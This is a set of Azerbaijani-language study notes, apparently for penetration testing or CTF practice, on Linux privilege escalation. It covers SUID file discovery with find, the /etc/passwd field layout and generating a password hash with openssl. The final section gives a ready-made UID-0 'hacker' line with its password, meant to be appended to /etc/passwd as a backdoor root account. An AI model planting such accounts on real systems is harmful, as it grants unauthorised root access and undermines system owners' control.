## fayl sistemində SUID/GUID fayllarını axtarmaq üçün

#find / -perm -u=s -type f 2>/dev/nul

1. find - "tap" əmrini işə salır

2. / - Bütün fayl sistemini axtarır

3. -perm - xüsusi icazələri olan faylları axtarır

4. -u=s - İstənilən icazə bit rejimi fayl üçün təyin edilmişdir. Bu formada simvolik rejimlər qəbul edilir

5. -tip f - Yalnız faylları axtarın

6. 2>/dev/null - Səhvləri aradan qaldırır


## /etc/passwd-haqqinda qeydler.

etc/passwd- dan cox rahat sekilde root`a qalxmaq olar ona gore burada diqqetli olmaq lazimdir

/etc/passwd faylı giriş zamanı tələb olunan vacib məlumatları saxlayır. Başqa sözlə, istifadəçi hesabı məlumatlarını saxlayır

1. O, hər bir hesab üçün : user ID, group ID, home directory, shell, and more haqqda melumat verir

2.Aşağıdakı kimi yeddi sahənin cəmi. Ümumiyyətlə, /etc/passwd fayl girişi aşağıdakı kimi görünür:

    test:x:0:0:root:/root:/bin/bash

iki nöqtə ilə bölünür (:)

1.USer name: İstifadəçi daxil olduqda istifadə olunur. Uzunluğu 1 ilə 32 simvol arasında olmalıdır.

2.Password : X simvolu şifrələnmiş parolun /etc/shadow faylında saxlandığını göstərir. Nəzərə alın ki, CLI-də yazılan parolun hashini hesablamaq və ya parolun hashini /etc/shadow faylında saxlamaq/yeniləmək üçün passwd əmrindən istifadə etməlisiniz, bu halda parol hashı "" kimi saxlanılır. x".

3. User ID ( UID ) : Hər bir istifadəçiyə istifadəçi ID (UID) təyin edilməlidir. UID 0 (sıfır) kök üçün, UID 1-99 isə əvvəlcədən təyin edilmiş digər hesablar üçün qorunur. Əlavə UID 100-999 inzibati və sistem hesabları/qrupları üçün sistem tərəfindən qorunur.
4. Group ID (GID) : Əsas qrup ID (/etc/group faylında saxlanılır)

5. User ID Info : Şərh sahəsi. Bu, istifadəçinin tam adı, telefon nömrəsi və s. kimi istifadəçilər haqqında əlavə məlumat əlavə etməyə imkan verir. Bu sahə barmaq əmri ilə istifadə olunur.

6. Home directory : İstifadəçi daxil olduqda onun daxil olacağı qovluğun mütləq yolu. Bu kataloq mövcud deyilsə, istifadəçilərin kataloqu / olur.

7. Command/shell : Əmr və ya qabığın mütləq yolu (/bin/bash). Tipik olaraq, bu bir qabıqdır. Nəzərə alın ki, bunun bir qabıq olması lazım deyil.


##  parol hash yaratmaq

# openssl passwd -1 -salt [salt] [password]

burada: ilk once opsenssl passwd -1 salt (istifadeci adi) +enter 
daha sonra qoymaq istediyimiz parolu qoyuruq

getend group  root -komandi ile  sisteminizde tanımlanmış tüm grupları ve ilgili bilgileri görüntüleyecektir. (root/root)
root:x:0:0:root:/root:/bin/bash  (burada 0:0 )ancaq roota aid olur diger istifadeciler 1000 1000 den baslayir


## openssl passwd hacker -1 salt hacker pass123
hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash
parol:pass123

at masina cix(bunu ucun nano /etc/passwd)


